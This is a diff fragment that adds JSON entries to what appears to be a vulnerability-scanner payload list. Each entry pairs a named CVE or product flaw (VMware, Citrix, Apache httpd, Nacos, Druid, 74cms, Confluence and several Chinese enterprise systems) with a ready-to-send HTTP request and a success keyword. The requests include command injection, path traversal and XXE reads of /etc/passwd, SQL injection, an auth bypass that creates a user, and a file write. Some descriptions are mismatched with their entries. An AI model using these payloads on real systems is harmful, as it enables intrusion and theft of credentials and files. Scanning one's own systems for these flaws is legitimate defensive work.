+        "uri": "/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "org.postgresql.Driver"
+    },
+    "vmware-vrealize-cve-2021-21975-ssrf": {
+      "description": "vmware-vrealize-cve-2021-21975-ssrf",
+      "payload": {
+        "method": "POST",
+        "uri": "/casa/nodes/thumbprints",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json"
+        },
+        "body": "[\"127.0.0.1:443/ui/\"]"
+      },
+      "location": "body",
+      "keywords": "vRealize Operations Manager"
+    },
+    "亿邮电子邮件系统RCE漏洞": {
+      "description": "亿邮电子邮件系统RCE漏洞",
+      "payload": {
+        "method": "POST",
+        "uri": "/webadm/?q=moni_detail.do&action=gragh",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "type='|cat /etc/passwd ||'"
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "华为家庭网关-hg659-fileread": {
+      "description": "华为家庭网关-hg659-fileread",
+      "payload": {
+        "method": "GET",
+        "uri": "/lib///....//....//....//....//....//....//....//....//etc//passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "帆软目录遍历": {
+      "description": "帆软目录遍历",
+      "payload": {
+        "method": "GET",
+        "uri": "/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "<rootManagerName>"
+    },
+    "浪潮tscev4命令执行": {
+      "description": "浪潮tscev4命令执行cve-2020-21224",
+      "payload": {
+        "method": "POST",
+        "uri": "/login",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": "op=login&username=admin || cat /etc/passwd&password=admin"
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:"
+    },
+    "紫光档案管理系统SQL注入": {
+      "description": "紫光档案管理系统 editPass.html SQL注入漏洞 CNVD-2021-41638",
+      "payload": {
+        "method": "GET",
+        "uri": "/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "c4ca4238a0b923820dcc509a6f75849"
+    },
+    "蓝凌OA任意文件读取": {
+      "description": "蓝凌OA custom.jsp 任意文件读取",
+      "payload": {
+        "method": "POST",
+        "uri": "/sys/ui/extend/varkind/custom.jsp",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "var={\"body\":{\"file\":\"file:///etc/passwd\"}}"
+      },
+      "location": "body",
+      "keywords": "for 16-bit app support"
+    },
+    "金禾OA_c6默认密码": {
+      "description": "金禾OA_c6默认密码",
+      "payload": {
+        "method": "POST",
+        "uri": "/c6/Jhsoft.Web.login/AjaxForLogin.aspx",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "SessionIDAdmin="
+    },
+    "齐治堡垒机任意用户登录": {
+      "description": "齐治堡垒机任意用户登录",
+      "payload": {
+        "method": "GET",
+        "uri": "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "错误的id"
+    },
+    "74cms-sqli-1": {
+      "description": "74cms-sqli-1",
+      "payload": {
+        "method": "POST",
+        "uri": "/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709\\xc3\\x97tamp=&nonce=",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "text/xml"
+        },
+        "body": "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE copyright [<!ENTITY test SYSTEM \"file:///\">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%' union select md5(123)#</Content></xml>"
+      },
+      "location": "body",
+      "keywords": "202cb962ac59075b964b07152d234b70"
+    },
+    "74cms-sqli-2": {
+      "description": "74cms-sqli-2",
+      "payload": {
+        "method": "GET",
+        "uri": "/plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{rand}}),5,6,7,8,9%23",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "202cb962ac59075b964b07152d234b70"
+    },
+    "74cms-sqli-3": {
+      "description": "74cms-sqli-3",
+      "payload": {
+        "method": "GET",
+        "uri": "/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa\") and extractvalue(1,concat(0x7e,md5(99999999))) -- a",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "ef775988943825d2871e1cfa75473ec"
+    },
+    "alibaba-canal-default-password": {
+      "description": "alibaba-canal-default-password",
+      "payload": {
+        "method": "POST",
+        "uri": "/api/v1/user/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"username\":\"admin\",\"password\":\"123456\"}"
+      },
+      "location": "body",
+      "keywords": "{\"code\":20000"
+    },
+    "alibaba-canal-info-leak": {
+      "description": "alibaba-canal-info-leak",
+      "payload": {
+        "method": "GET",
+        "uri": "/api/v1/canal/config/1/0",
+        "headers": {
+          "User-Agent": "Nacos-Server"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "ncanal.aliyun.accessKey"
+    },
+    "alibaba-nacos-v1-auth-bypass": {
+      "description": "alibaba-nacos-v1-auth-bypass",
+      "payload": {
+        "method": "POST",
+        "uri": "/nacos/v1/auth/users?username=chumeng&password=chumeng",
+        "headers": {
+          "User-Agent": "Nacos-Server"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "create user ok!"
+    },
+    "apache-ambari-default-password": {
+      "description": "apache-ambari-default-password",
+      "payload": {
+        "method": "GET",
+        "uri": "/api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json;charset=UTF-8",
+          "Authorization": "Basic YWRtaW46YWRtaW4="
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "PrivilegeInfo"
+    },
+    "Apache Cocoon XML注入 CVE-2020-11991": {
+      "description": " Apache Cocoon XML注入 CVE-2020-11991",
+      "payload": {
+        "method": "POST",
+        "uri": "/v2/api/product/manger/getInfo",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "text/xml"
+        },
+        "body": "<!--?xml version=\"1.0\" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]><userInfo><firstName>John</firstName> <lastName>&ent;</lastName></userInfo>"
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "apache-flink-upload-rce": {
+      "description": "apache-flink-upload-rce",
+      "payload": {
+        "method": "POST",
+        "uri": "/jars/upload",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json;charset=UTF-8"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "success"
+    },
+    "apache-httpd-cve-2021-41773-path-traversal": {
+      "description": "apache任意文件读取，同时也可以通过另一种方式进行命令执行，可根据cve进行搜索",
+      "payload": {
+        "method": "GET",
+        "uri": "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:"
+    },
+    "apache-httpd-cve-2021-41773-RCE": {
+      "description": "apache任意文件读取，同时也命令执行",
+      "payload": {
+        "method": "POST",
+        "uri": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "1123123"
+    },
+    "apache-kylin-unauth-cve-2020-13937": {
+      "description": "apache-kylin-unauth-cve-2020-13937",
+      "payload": {
+        "method": "GET",
+        "uri": "/kylin/api/admin/config",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "config"
+    },
+    "apache-kylin-命令注入漏洞": {
+      "description": " Apache Kylin DiagnosisController.java 命令注入漏洞 CVE-2020-13925",
+      "payload": {
+        "method": "GET",
+        "uri": "/kylin/api/diag/project/%7C%7Cping%20%60whoami%60.111.111.111%20%7C%7C/download",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "111.111.111"
+    },
+    "apache-nifi-api-unauthorized-access": {
+      "description": "apache-nifi-api-unauthorized-access",
+      "payload": {
+        "method": "GET",
+        "uri": "/nifi-api/flow/current-user",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "json"
+    },
+    "apache-ofbiz-cve-2018-8033-xxe": {
+      "description": "apache-ofbiz-cve-2018-8033-xxe",
+      "payload": {
+        "method": "POST",
+        "uri": "/webtools/control/xmlrpc",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/xml"
+        },
+        "body": "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY disclose SYSTEM \"file://///etc/passwd\">]><methodCall><methodName>&disclose;</methodName></methodCall>"
+      },
+      "location": "body",
+      "keywords": "text/xml"
+    },
+    "apache-ofbiz-cve-2020-9496-xml-deserialization": {
+      "description": "apache-ofbiz-cve-2020-9496-xml-deserialization",
+      "payload": {
+        "method": "POST",
+        "uri": "/webtools/control/xmlrpc",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/xml"
+        },
+        "body": "<?xml version=\"1.0\"?><methodCall><methodName>268705214</methodName><params><param><value>dwisiswant0</value></param></params></methodCall>"
+      },
+      "location": "body",
+      "keywords": "methodResponse"
+    },
+    "Apache-ShenYu账号密码泄漏漏洞": {
+      "description": " Apache ShenYu dashboardUser 账号密码泄漏漏洞 CVE-2021-37580",
+      "payload": {
+        "method": "GET",
+        "uri": "/dashboardUser",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "query dashboard users success"
+    },
+    "Apache-Solr未授权访问": {
+      "description": "Apache-Solr未授权访问",
+      "payload": {
+        "method": "GET",
+        "uri": "/solr/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "Core Admin"
+    },
+    "apache-storm-unauthorized-access": {
+      "description": "apache-storm-unauthorized-access",
+      "payload": {
+        "method": "GET",
+        "uri": "/api/v1/cluster/summary",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "{\"totalMem\":"
+    },
+    "Apache Druid 任意文件读取": {
+      "description": "由于用户指定 HTTP InputSource 没有做出限制，可以通过将文件 URL 传递给 HTTP InputSource 来绕过应用程序级别的限制。由于 Apache Druid 默认情况下是缺乏授权认证，攻击者可利用该漏洞在未授权情况下，构造恶意请求执行文件读取，最终造成服务器敏感性信息泄露",
+      "payload": {
+        "method": "POST",
+        "uri": "/druid/indexer/v1/sampler?for=connect",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/json;charset=UTF-8"
+        },
+        "body": "{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"http\",\"uris\":[\"file:///etc/passwd\"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"parser\":{\"type\":\"string\",\"parseSpec\":{\"format\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"a\"],\"dimensionsSpec\":{},\"timestampSpec\":{\"column\":\"!!!_no_such_column_!!!\",\"missingValue\":\"2010-01-01T00:00:00Z\"}}}}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}"
+      },
+      "location": "body",
+      "keywords": "root:x:0:"
+    },
+    "Apache httpd_SSRF": {
+      "description": "Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞",
+      "payload": {
+        "method": "GET",
+        "uri": "/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://www.baidu.com/",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "百度一下"
+    },
+    "cacti-weathermap-file-write": {
+      "description": "cacti-weathermap-file-write",
+      "payload": {
+        "method": "GET",
+        "uri": "/plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "renyizifumofamen"
+    },
+    "citrix-cve-2019-19781-path-traversal": {
+      "description": "citrix-cve-2019-19781-path-traversal",
+      "payload": {
+        "method": "GET",
+        "uri": "/vpn/../vpns/cfg/smb.conf",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "encrypt passwords"
+    },
+    "citrix-xenmobile-cve-2020-8209": {
+      "description": "citrix-xenmobile-cve-2020-8209",
+      "payload": {
+        "method": "GET",
+        "uri": "/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "root:x:0:0:root"
+    },
+    "citrix-cve-2020-8193-unauthorized": {
+      "description": "citrix-cve-2020-8193-unauthorized",
+      "payload": {
+        "method": "GET",
+        "uri": "/pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "X-NITRO-PASS": "'chumeng'",
+          "X-NITRO-USER": "'chumeng'"
+        },
+        "body": "<appfwprofile><login></login></appfwprofile>"
+      },
+      "location": "body",
+      "keywords": "renyizifumofamen"
+    },
+    "coldfusion-cve-2010-2861-lfi": {
+      "description": "Atlassian Confluence是企业广泛使用的wiki系统,产品研发过程中的需求文档、产品设计文档、项目管理文档、技术文档、运维文档等等都统一发布在wiki中，并不断地迭代维护。所以想着自己的协同的办公也可使Confluence来实现，远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式进行注入，实现在 Confluence Server或Data Center上执行任意代码.",
+      "payload": {
+        "method": "GET",
+        "uri": "/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "rdspassword"
+    },
+    "confluence-cve-2015-8399": {
+      "description": "Atlassian Confluence是企业广泛使用的wiki系统,产品研发过程中的需求文档、产品设计文档、项目管理文档、技术文档、运维文档等等都统一发布在wiki中，并不断地迭代维护。所以想着自己的协同的办公也可使Confluence来实现，远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式进行注入，实现在 Confluence Server或Data Center上执行任意代码.",
+      "payload": {
+        "method": "GET",
+        "uri": "/spaces/viewdefaultdecorator.action?decoratorName",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
+        },
+        "body": ""
+      },
+      "location": "body",
+      "keywords": "confluence-init.properties"
+    },
+    "confluence-cve-2019-3396-lfi": {
+      "description": "Atlassian Confluence是企业广泛使用的wiki系统,产品研发过程中的需求文档、产品设计文档、项目管理文档、技术文档、运维文档等等都统一发布在wiki中，并不断地迭代维护。所以想着自己的协同的办公也可使Confluence来实现，远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式进行注入，实现在 Confluence Server或Data Center上执行任意代码.",
+      "payload": {
+        "method": "POST",
+        "uri": "/rest/tinymce/1/macro/preview",
+        "headers": {
